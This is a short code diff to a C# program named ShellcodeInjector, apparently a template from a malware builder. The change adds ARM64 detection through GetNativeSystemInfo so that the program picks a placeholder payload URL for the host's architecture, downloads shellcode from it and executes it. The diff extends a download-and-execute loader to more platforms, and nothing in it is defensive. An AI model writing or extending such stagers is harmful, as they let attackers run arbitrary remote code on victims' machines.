@@ -13,10 +13,25 @@ namespace ShellcodeInjector
 
         static void Main()
         {
-            var is64Bit = IntPtr.Size == 8;
-            var url = is64Bit ? "%URL64%" : "%URL32%";
+            SYSTEM_INFO sysInfo;
+            NativeImports.GetNativeSystemInfo(out sysInfo);
+
+            string url;
+            switch (sysInfo.wProcessorArchitecture)
+            {
+                case 12: // ARM64
+                    url = "%URLARM64%";
+                    break;
+                case 9: // x64
+                    url = "%URL64%";
+                    break;
+                default: // x86
+                    url = "%URL32%";
+                    break;
+            }
+
             var payload = Downloader.DownloadFromUrl(url);
-            ShellcodeRunner.RunPayload(payload);
+            ShellcodeRunner.RunPayload(payload, sysInfo.wProcessorArchitecture);
         }
     }
 }
